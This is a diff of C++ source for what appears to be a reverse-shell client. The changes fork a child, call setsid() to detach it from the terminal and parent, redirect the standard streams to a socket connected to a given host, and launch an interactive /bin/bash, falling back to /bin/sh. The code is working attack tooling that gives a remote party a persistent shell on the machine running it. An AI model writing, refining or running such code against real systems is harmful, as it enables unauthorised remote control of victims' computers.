@@ -1,6 +1,6 @@
 #include <string>
 #include <stdexcept> // std::invalid_argument
-#include <unistd.h> // dup2, execl, STDOUT_FILENO, STDIN_FILENO, STDERR_FILENO
+#include <unistd.h> // fork, setsid, dup2, execl, access, STDOUT_FILENO, STDIN_FILENO, STDERR_FILENO
 #include <string.h> // strlen
 #include "client.h"
 #include "log.h"
@@ -22,20 +22,47 @@ Client::Client(char *host, int port) {
 
 Client::~Client() {
 	delete[] this->host;
+	close(this->sockfd);
 }
 
 
 int Client::start() {
 	if (establishConnection() != 0) {
-		std::cerr << "Failed to establish connection to:\n\t" << this->host << ":" << this->port << std::endl;
+		std::string hostAddr = this->host;
+		Log::error("Failed to establish connection to:\n\t" + hostAddr + ":" + std::to_string(this->port));
 		return -1;
 	}
 
-	// Start a bash shell and redirect its stdout, stdin and stderr to the socket
-	dup2(this->sockfd, STDOUT_FILENO);
-	dup2(this->sockfd, STDIN_FILENO);
-	dup2(this->sockfd, STDERR_FILENO);
-	execl("/bin/bash", "/bin/bash", "-i", NULL);
+	pid_t childPid = fork();
+	if (childPid == 0) {
+		// Run the new process in the background as a daemon and add it in a new
+		// process group as a leader to disassociate it from the parent and the terminal
+		// and avoid SIGHUP signal when the parent is killed
+		if (setsid() == -1) {
+			Log::error("setsid failed");
+			return -1;
+		}
+		// Start a bash shell in the background and redirect its stdout, stdin and stderr to the socket
+		dup2(this->sockfd, STDOUT_FILENO);
+		dup2(this->sockfd, STDIN_FILENO);
+		dup2(this->sockfd, STDERR_FILENO);
+		close(this->sockfd); // Socket FD no longer needed
 
+		// /bin/bash
+		if (execl("/bin/bash", "/bin/bash", "-i", NULL) == -1) {
+			Log::error("execl failed (/bin/bash)");
+		}
+
+		Log::info("Couln't run /bin/bash. Trying /bin/sh...");
+
+		// /bin/sh
+		if (execl("/bin/sh", "/bin/sh", "-i", NULL) == -1) {
+			Log::error("execl failed (/bin/sh)");
+			return -1;
+		}
+	} else if (childPid < 0) {
+		Log::error("fork failed");
+		return -1;
+	}
 	return 0;
 }
